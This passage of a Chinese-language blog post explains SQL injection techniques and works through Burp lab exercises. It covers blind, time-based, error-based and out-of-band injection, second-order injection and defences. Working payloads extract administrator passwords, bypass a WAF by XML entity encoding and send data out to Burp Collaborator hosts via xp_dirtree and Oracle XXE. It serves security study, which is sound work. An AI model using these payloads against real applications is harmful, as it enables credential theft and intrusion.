+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">xyz</span><span class="s1">&#39; AND (SELECT CASE WHEN (Username = &#39;</span><span class="n">Administrator</span><span class="s1">&#39; AND SUBSTRING(Password, 1, 1) &gt; &#39;</span><span class="n">m</span><span class="s1">&#39;) THEN 1/0 ELSE &#39;</span><span class="n">a</span><span class="s1">&#39; END FROM Users)=&#39;</span><span class="n">a</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="">
+</h3><h3 id="">
+</h3><p>典型错误：</p>
+<ol>
+<li><strong>类型转换错误</strong>：例如在数值列中注入字符串，仅当条件为真时执行该转换（如<code>AND (IF(1=1, CAST('a' AS INT), 0))</code>）；</li>
+<li><strong>子查询语法错误</strong>：构造仅在条件为真时返回多行的子查询，触发 “单行子查询返回多行” 错误；</li>
+<li><strong>函数调用错误</strong>：调用数据库内置函数时传入非法参数，仅在条件为真时触发函数执行错误。</li>
+</ol>
+<h4 id="报错">报错
+</h4><p>由于数据库<strong>配置不当</strong>，有时会输出错误信息，在某些情况下，你甚至可以诱导应用生成<strong>包含查询结果数据</strong>的错误信息。这一手段能将原本的盲注漏洞，转化为可直接查看数据的 “显错注入”，大幅降低攻击难度。</p>
+<p>你可以使用<code>CAST()</code>函数实现这一目的，该函数的作用是将一种数据类型转换为另一种。例如，构造包含如下语句的查询：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">CAST</span><span class="p">((</span><span class="k">SELECT</span><span class="w"> </span><span class="n">example_column</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">example_table</span><span class="p">)</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="nb">int</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>通常，你试图读取的目标数据是字符串类型，而将字符串强制转换为不兼容的类型（如整数<code>int</code>）时，数据库会抛出类似如下的错误：</p>
+<blockquote>
+<p>ERROR: invalid input syntax for type integer: &ldquo;Example data&rdquo;</p>
+</blockquote>
+<p>值得注意的是，若目标应用存在字符长度限制，导致你无法通过常规的条件响应方式进行盲注时，这种利用类型转换错误提取数据的方法会尤为有效。</p>
+<h4 id="时间">时间
+</h4><p>若应用在SQL查询执行时捕获数据库错误并优雅处理，其响应不会出现任何差异——这意味着前文所述的条件错误注入技术将失效。</p>
+<p>这种情况下，可通过<strong>根据注入条件的真假触发不同时间延迟</strong>来利用盲注漏洞。由于应用通常会同步处理SQL查询，延迟SQL执行会导致HTTP响应同步延迟，因此可通过接收响应的耗时判断注入条件的真假。</p>
+<p>触发时间延迟的技术因数据库类型而异。例如在Microsoft SQL Server中，可通过以下语句测试条件并根据结果触发延迟：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;; IF (1=2) WAITFOR DELAY &#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">10</span><span class="s1">&#39;--
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="p">;</span><span class="w"> </span><span class="k">IF</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="n">WAITFOR</span><span class="w"> </span><span class="n">DELAY</span><span class="w"> </span><span class="s1">&#39;0:0:10&#39;</span><span class="c1">--
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第一条输入不触发延迟（条件1=2为假）；</li>
+<li>第二条输入触发10秒延迟（条件1=1为真）。</li>
+</ul>
+<p>借助该技术可逐字符提取数据，示例如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &#39;</span><span class="n">Administrator</span><span class="s1">&#39; AND SUBSTRING(Password, 1, 1) &gt; &#39;</span><span class="n">m</span><span class="s1">&#39;) = 1 WAITFOR DELAY &#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="err">{</span><span class="n">delay</span><span class="err">}</span><span class="s1">&#39;--
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>SQL查询中触发时间延迟的方式多样，不同数据库适用不同技术，详情可参考SQL注入速查表。</p>
+<h4 id="带外">带外
+</h4><p>某些应用可能会以<strong>异步方式</strong>执行与之前示例相同的SQL查询：应用在原线程中继续处理用户请求，同时<strong>用另一个线程</strong>执行包含Tracking Cookie的SQL查询。此时查询仍存在SQL注入漏洞，但此前介绍的所有技术都将失效——因为应用的响应不依赖于查询返回的数据、数据库错误，也不依赖于查询的执行时间。</p>
+<p>这种情况下，通常可以通过<strong>触发向你控制的系统发起带外网络交互</strong>来利用盲注漏洞。你可以基于注入的条件触发这类交互，从而逐段推断信息；更实用的是，还能直接<strong>通过网络交互泄露数据</strong>。</p>
+<p>多种网络协议都可用于此目的，但最有效的通常是DNS（域名系统）——许多生产网络允许<strong>DNS查询自由出站</strong>，因为这是生产系统正常运行的必要条件。</p>
+<p>使用带外技术最简单可靠的工具是<strong>Burp Collaborator</strong>：这是一个提供多种网络服务（包括DNS）自定义实现的服务器，能让你检测发送单个载荷后是否触发了网络交互。Burp Suite专业版内置了客户端，默认已配置好与Burp Collaborator的协作。更多信息可参考Burp Collaborator的文档。</p>
+<p>触发DNS查询的技术因数据库类型而异。例如，在Microsoft SQL Server中，以下输入可导致数据库对指定域名发起DNS查询：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;; exec master..xp_dirtree &#39;</span><span class="o">//</span><span class="mi">0</span><span class="n">efdymgw1o5w9inae8mg4dfrgim9ay</span><span class="p">.</span><span class="n">burpcollaborator</span><span class="p">.</span><span class="n">net</span><span class="o">/</span><span class="n">a</span><span class="s1">&#39;--
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><code>exec master..xp_dirtree</code>调用系统存储过程，传入的参数是一个<strong>网络共享 UNC 路径</strong>（<code>//域名/a</code>）</p>
+</blockquote>
+<p>这会让数据库查询以下域名：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>子域名外带：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;; exec master..xp_dirtree &#39;</span><span class="o">//</span><span class="s1">&#39; + (SELECT password FROM users WHERE username=&#39;</span><span class="n">administrator</span><span class="s1">&#39;) + &#39;</span><span class="p">.</span><span class="mi">0</span><span class="n">efdymgw1o5w9inae8mg4dfrgim9ay</span><span class="p">.</span><span class="n">burpcollaborator</span><span class="p">.</span><span class="n">net</span><span class="o">/</span><span class="n">a</span><span class="s1">&#39;--
+</span></span></span><span class="line"><span class="cl"><span class="s1">或者多语句结合
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="p">;</span><span class="w"> </span><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">p</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">1024</span><span class="p">);</span><span class="k">set</span><span class="w"> </span><span class="o">@</span><span class="n">p</span><span class="o">=</span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;Administrator&#39;</span><span class="p">);</span><span class="k">exec</span><span class="p">(</span><span class="s1">&#39;master..xp_dirtree &#34;//&#39;</span><span class="o">+@</span><span class="n">p</span><span class="o">+</span><span class="s1">&#39;.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a&#34;&#39;</span><span class="p">)</span><span class="c1">--
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>你可以用Burp Collaborator生成唯一的子域名，然后轮询Collaborator服务器，确认DNS查询是否发生。</p>
+<h3 id="其他环境下的-sql-注入">其他环境下的 SQL 注入
+</h3><p>实际上，只要应用会将你可控制的输入作为SQL查询处理，任何这类输入都能用于实施SQL注入攻击。例如，部分网站会接收JSON或XML格式的输入，并利用这些输入查询数据库。</p>
+<p>这些不同的格式能为你提供多种<strong>混淆攻击的方法</strong>，以绕过原本会被WAF（Web应用防火墙）及其他防御机制拦截的攻击。许多防御机制的实现较为薄弱，仅通过在请求中搜索常见的SQL注入关键字（如<code>SELECT</code>、<code>UNION</code>）进行拦截，因此你可以通过对禁用关键字中的字符进行<strong>编码或转义</strong>，绕过这类过滤。例如，以下基于XML的SQL注入就使用了XML转义序列对<code>SELECT</code>中的<code>S</code>字符进行编码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;stockCheck&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;productId&gt;</span>123<span class="nt">&lt;/productId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;storeId&gt;</span>999 <span class="ni">&amp;#x53;</span>ELECT * FROM information_schema.tables<span class="nt">&lt;/storeId&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/stockCheck&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>该转义字符会在<strong>服务器端被解码</strong>后，再传递给SQL解释器执行。</p>
+<h3 id="二阶注入">二阶注入
+</h3><p><strong>一阶SQL注入</strong>指应用程序处理HTTP请求中的用户输入时，以不安全的方式将输入直接拼接到SQL查询中，导致漏洞触发。</p>
+<p><strong>二阶SQL注入</strong>则是指应用程序先接收HTTP请求中的用户输入并存储（通常存入数据库），但数据存储阶段并不存在漏洞；后续处理另一个HTTP请求时，应用程序<strong>从存储中读取该数据</strong>，却以不安全的方式将其拼接到SQL查询中，最终触发注入。因此，二阶SQL注入也被称为<strong>存储型SQL注入</strong>（stored SQL injection）。</p>
+<p>二阶SQL注入的典型场景是：开发者已知一阶注入的风险，因此在数据<strong>首次存储</strong>时做了安全处理（如转义、参数化查询）；但后续读取该数据时，错误地认为“已存入数据库的数据是安全可信的”，未做任何安全校验就直接用于SQL查询，最终因这种“信任误用”导致漏洞。</p>
+<p>典型场景示例</p>
+<ol>
+<li>
+<p><strong>用户注册场景</strong>：
+注册时输入用户名 <code>admin'--</code>，应用程序用参数化查询将其安全存入数据库（存储内容为 <code>admin'--</code>）；</p>
+</li>
+<li>
+<p><strong>后台用户查询场景</strong>：
+管理员在后台查询用户信息时，应用程序读取数据库中的用户名，以不安全方式拼接SQL：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;$stored_username&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>拼接后实际执行的SQL为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="c1">--&#39;;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>注释符 <code>--</code> 导致后续语句被忽略，实现越权查询。</p>
+</li>
+</ol>
+<h3 id="防范注入">防范注入
+</h3><p><strong>核心方案：参数化查询（预处理语句）</strong>
+用占位符<code>?</code>替代直接字符串拼接，将SQL查询结构与用户输入数据彻底分离，数据库会自动转义特殊字符，从根源杜绝注入。这是处理<strong>数据层面输入</strong>（WHERE条件、INSERT/UPDATE值）的最优解。</p>
+<p><strong>局限性与替代方案</strong>
+参数化查询无法用于SQL<strong>结构层面</strong>（表名、列名、ORDER BY子句）。此类场景需：</p>
+<ul>
+<li>白名单校验：仅允许预设的合法值；</li>
+<li>逻辑重构：通过业务逻辑绕开用户输入直接参与SQL结构。</li>
+</ul>
+<p><strong>关键原则</strong></p>
+<ul>
+<li>硬编码SQL常量：参数化查询的SQL语句必须是固定常量，不包含任何变量；</li>
+<li>拒绝主观信任：无论数据来源（用户输入、数据库存储数据），均不直接拼接，避免二阶注入等风险；</li>
+<li>禁用选择性拼接：不凭经验判断“数据是否安全”，彻底杜绝字符串拼接的使用。</li>
+</ul>
+<h2 id="labs-题解">Labs 题解
+</h2><h3 id="union-攻击-1">Union 攻击
+</h3><h4 id="常规">常规
+</h4><p>注入点：<code>/filter?category=Corporate+gifts</code></p>
+<p>题目要求用 NULL 查询，所以闭合引号后，逐步添加 NULL 即可。payload <code>'+UNION+SELECT+NULL,NULL,NULL--</code></p>
+<h4 id="找可用列">找可用列
+</h4><p>注入点：<code>/filter?category=Clothing%2c+shoes+and+accessories</code></p>
+<p>先出列数 <code>'+ORDER+BY+3--</code></p>
+<p>题目说 <code>Make the database retrieve the string: 'iIwJ8H'</code> 所以用 <code>'iIwJ8H'</code> 逐个替换 NULL 查询即可。</p>
+<blockquote>
+<p>感觉有点奇怪的判断……</p>
+</blockquote>
+<h4 id="拼接字符串">拼接字符串
+</h4><p>注入点：<code>/filter?category=Gifts</code></p>
+<p>先判断列数：发现只有两列，而且只有一列是 string：<code>'+UNION+SELECT+NULL,'abc'--</code>,所以得考虑将 username 和 password 拼接起来</p>
+<p>payload：<code>'+UNION+SELECT++NULL,username||'~'||password+FROM+users--</code></p>
+<h3 id="数据库查询">数据库查询
+</h3><h4 id="普通查询">普通查询
+</h4><p>注入点：<code>/filter?category=Gifts</code></p>
+<p>先判断列数：发现 <code>'UNION+SELECT+NULL,NULL--</code> 不管多少都查询错误，考虑可能是数据库不一样，换成了 <code>'UNION+SELECT+NULL,NULL#--</code> ，查询成功，然后查询指定列即可。</p>
+<h4 id="查表列名">查表、列名
+</h4><p>注入点：<code>/filter?category=Gifts</code></p>
+<p>先判断列数：<code>'+ORDER+BY+2</code> 两列</p>
+<p>1.查表名，这里出了问题。一开始的查询：<code>'+UNION+SELECT+*,+NULL+FROM+information_schema.tables--</code>，如果用通配符的话，会导致列数的不匹配！需要直接指定列名：<code>'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--</code>，发现特殊表 <code>users_inatpk</code></p>
+<p>2.查列名，<code>'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_inatpk'</code>,查询 information_schema.columns 表，需要指定对应的表名，否则结果很多，发现列名 <code>password_xzxkya</code> <code>username_rxlzlc</code></p>
+<p>3.查数据，<code>'+UNION+SELECT+username_rxlzlc,password_xzxkya+FROM+users_inatpk--</code></p>
+<h3 id="盲注-1">盲注
+</h3><h4 id="布尔盲注">布尔盲注
+</h4><p>1.注入点：<code>Cookie: TrackingId=ZVcenZbEGyKbb2Nc</code>，用 <code>' and '1' ='1</code> 来判断一下是否存在布尔盲注，发现查询成功的话会返回 <code>Welcome</code> 字段。</p>
+<p>2.检验：<code>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</code> 来判断 users 表是否存在。这里的思路是 select 出一个恒等的字符串来验证，后面方便拼接进语句。</p>
+<p>3.查长度：<code>' AND (SELECT 'a' FROM users WHERE username='administrator' and length(password)&gt;1)='a</code> 确定存在，然后 <code>' AND (SELECT 'a' FROM users WHERE username='administrator' and length(password)=20)='a</code> 确定有 20 位</p>
+<p>4.查各个位数：手动查显然太麻烦了，这里用 Burp 的 Intruder 可以半自动查询。语句为<code> ' and (select substring(password,1,1) from users where username='administrator') = 'a</code>,把最后的 a 设为爆破点，然后手动调整 (password,num,1) 进行爆破。</p>
+<p>5.记录：birxocztgrtwf7ugbhw3</p>
+<h4 id="条件盲注">条件盲注
+</h4><p>1.判断注入点：<code>Cookie: TrackingId=y0chXfk5EGo4lz1o</code>，<code>'</code> 报错，<code>''</code> 不报错，从而确定是 SQL 语法报错注入。</p>
+<p>2.判断数据库类型：<code>'||(SELECT '')||'</code> 报错，<code>'||(SELECT '' FROM dual)||'</code> 不报错，从而判断是 Oracle</p>
+<p>3.验证目标表存在：<code>'||(SELECT '' FROM not-a-real-table)||'</code> 报错，<code>'||(SELECT '' FROM users WHERE ROWNUM = 1)||'</code> 不报错</p>
+<blockquote>
+<p>这里用 ROENUM 类似 limit，为的是方式返回多行结果</p>
+<p>总体思路就是通过字符串拼接来测试报错</p>
+</blockquote>
+<p>4.条件判断可行性：<code>'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</code> 不报错，而改成 <code>1=2</code> 报错（除零），故可行。</p>
+<p>5.出长度：<code>'||(SELECT CASE WHEN LENGTH(password)&gt;1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code></p>
+<p>6.出密码：<code>'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</code> 和前面一样，Intruder 枚举 <code>a</code>，手动改第一个 1 即可</p>
+<blockquote>
+<p>用 cluster bomb 更简单。sqlmap 不会用。</p>
+<p>技巧是全部扫完后，多选 - 高亮指定length - 排序。</p>
+</blockquote>
+<h4 id="报错信息泄露">报错信息泄露
+</h4><p>1.注入点：<code>Cookie: TrackingId=B8kZGghEST0pmL5o</code>，加一个<code>'</code>，发现报错：<code>Unterminated string literal started at position</code>，考虑信息泄露</p>
+<p>2.测试报错：<code>' and cast((select 1) as int)--</code>,报错<code>ERROR: argument of AND must be type boolean, not type integer</code>，验证。<code>' AND 1=CAST((SELECT 1) AS int)--</code>，不报错，是可以用的。<code>' AND 1=CAST((SELECT username FROM users) AS int)--</code> 但是这样子又变成了最开始的报错，考虑是<strong>输入被截断</strong>了！！</p>
+<p>3.解决截断：<code>' AND 1=CAST((SELECT username FROM users) AS int)--</code>，报错变成<code>ERROR: more than one row returned by a subquery used as an expression</code>，再改成 <code>' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</code>,报错<code>ERROR: invalid input syntax for type integer: &quot;administrator&quot;</code>，成功出用户名！</p>
+<p>4.出密码：<code>' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</code></p>
+<h4 id="时间盲注">时间盲注
+</h4><p>1.注入点判断：<code>Cookie: TrackingId=x</code>,添加<code>'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</code>，对比<code>'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</code> 发现延时，有时间盲注。这里的 <code>%3B</code> 是分号，防止 burp 识别成两个参数。</p>
+<blockquote>
+<p><strong><code>pg_sleep(n)</code>的函数类型</strong>：<code>pg_sleep</code>是 PostgreSQL 的 <strong>“延迟函数”</strong>，返回值类型为<code>void</code>（无返回值），它的作用是<strong>暂停当前数据库会话的执行 <strong>，仅能在<code>SELECT</code>语句的</strong>选择列表</strong>（<code>SELECT 列/函数</code>）中执行，<strong>无法作为<code>WHERE</code>子句的条件表达式</strong>。</p>
+</blockquote>
+<p>2.验证条件：<code>'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code></p>
+<p>3.出长度：<code>'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code></p>
+<p>4.出密码：<code>'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code></p>
+<blockquote>
+<p>Intruder 里爆破，为了保证有效性，需要在 Resource Pool 里把线程数调整为 1，这样会串行发送请求（否则会同时发送n个，导致共同阻塞）。同时，看结果是需要开启顶栏 - columns - Response Received</p>
+<p>Cluster Bomp用不了，只能手动调整数字，然后爆破字母，可以用多线程。</p>
+</blockquote>
+<h4 id="带外盲注">带外盲注
+</h4><p>1.注入点：<code>Cookie: TrackingId=VKVwX08YULpCF0yM</code></p>
+<p>2.尝试带外：<code>'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http://255pds2evbd16n9qqk51tr8fu60xoncc.oastify.com&quot;&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--</code></p>
+<blockquote>
+<p>payload讲解：</p>
+<p>该语句的关键是<strong>利用 Oracle 的 XML 外部实体注入（XXE）特性触发带外 HTTP 请求</strong>，流程如下</p>
+<ol>
+<li><strong>闭合并拼接联合查询</strong>：通过单引号<code>'</code>闭合原始 SQL 的字符串，再用<code>UNION SELECT</code>拼接恶意查询，确保整体 SQL 语法合法。</li>
+<li><strong>构造 XML 类型数据</strong>：<code>xmltype(...)</code>将包含外部实体的 XML 字符串转换为 <strong>Oracle 可解析</strong>的 XML 对象。</li>
+<li>解析外部实体触发带外请求：
+<ul>
+<li>当 Oracle 解析 XML 中的<code>%remote;</code>实体时，会根据<code>SYSTEM</code>指定的<code>http://BURP-COLLABORATOR-SUBDOMAIN/</code>发起<strong>HTTP 请求</strong>；</li>
+<li>即使该 HTTP 请求无返回数据，Burp Collaborator 服务器也能捕获到这个请求，证明注入语句被执行。</li>
+</ul>
+</li>
+<li><strong>补全语法并执行</strong>：<code>EXTRACTVALUE</code>和<code>FROM dual</code>补全 Oracle 的查询语法，让整个语句顺利执行，无语法错误。</li>
+</ol>
+<p>在 Oracle 数据库的带外注入中，<strong>无法直接通过常规 SQL 语法发起 HTTP 请求</strong>，必须借助 XML 相关函数（如<code>xmltype</code>+<code>EXTRACTVALUE</code>）间接实现，核心原因是<strong>Oracle 本身没有内置的原生 HTTP 请求函数</strong></p>
+</blockquote>
+<p>plus</p>
+<p>payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;+UNION+SELECT+EXTRACTVALUE(xmltype(&#39;</span><span class="o">&lt;%</span><span class="mi">3</span><span class="n">fxml</span><span class="o">+</span><span class="k">version</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s2">&#34;1.0&#34;</span><span class="o">+</span><span class="k">encoding</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="s2">&#34;UTF-8&#34;</span><span class="o">%</span><span class="mi">3</span><span class="n">f</span><span class="o">&gt;&lt;!</span><span class="n">DOCTYPE</span><span class="o">+</span><span class="n">root</span><span class="o">+</span><span class="p">[</span><span class="o">+&lt;!</span><span class="n">ENTITY</span><span class="o">+%</span><span class="mi">25</span><span class="o">+</span><span class="n">remote</span><span class="o">+</span><span class="k">SYSTEM</span><span class="o">+</span><span class="s2">&#34;http%3a//&#39;||(SELECT+password+FROM+users+WHERE+username%3d&#39;administrator&#39;)||&#39;.BURP-COLLABORATOR-SUBDOMAIN/&#34;</span><span class="o">&gt;+%</span><span class="mi">25</span><span class="n">remote</span><span class="o">%</span><span class="mi">3</span><span class="n">b</span><span class="p">]</span><span class="o">&gt;</span><span class="s1">&#39;),&#39;</span><span class="o">/</span><span class="n">l</span><span class="s1">&#39;)+FROM+dual--
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后看子域名即可</p>
+<h3 id="其他场景的注入">其他场景的注入
+</h3><h4 id="xml-编码绕过-waf">XML 编码绕过 WAF
+</h4><p>1.注入点：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;stockCheck&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;productId&gt;</span>2<span class="nt">&lt;/productId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;storeId&gt;</span>1<span class="nt">&lt;/storeId&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/stockCheck&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.测试：改为 <code>1 union select null</code> ，发现被检查出攻击了，有 waf。将内容进行 html 实体编码，发现绕过了。再测试，发现只能返回一行，所以需要拼接字符串。</p>
+<p>3.payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;stockCheck&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;productId&gt;</span>2<span class="nt">&lt;/productId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;storeId&gt;</span>1 UNION SELECT username || &#39;~&#39; || password FROM users<span class="nt">&lt;/storeId&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/stockCheck&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>把<code>1 UNION SELECT username || '~' || password FROM users</code> 编码为<code>&amp;#49;&amp;#32;&amp;#85;&amp;#78;&amp;#73;&amp;#79;&amp;#78;&amp;#32;&amp;#83;&amp;#69;&amp;#76;&amp;#69;&amp;#67;&amp;#84;&amp;#32;&amp;#117;&amp;#115;&amp;#101;&amp;#114;&amp;#110;&amp;#97;&amp;#109;&amp;#101;&amp;#32;&amp;#124;&amp;#124;&amp;#32;&amp;#39;&amp;#126;&amp;#39;&amp;#32;&amp;#124;&amp;#124;&amp;#32;&amp;#112;&amp;#97;&amp;#115;&amp;#115;&amp;#119;&amp;#111;&amp;#114;&amp;#100;&amp;#32;&amp;#70;&amp;#82;&amp;#79;&amp;#77;&amp;#32;&amp;#117;&amp;#115;&amp;#101;&amp;#114;&amp;#115;</code></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/burp%E9%9D%B6%E5%9C%BA/">Burp靶场</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
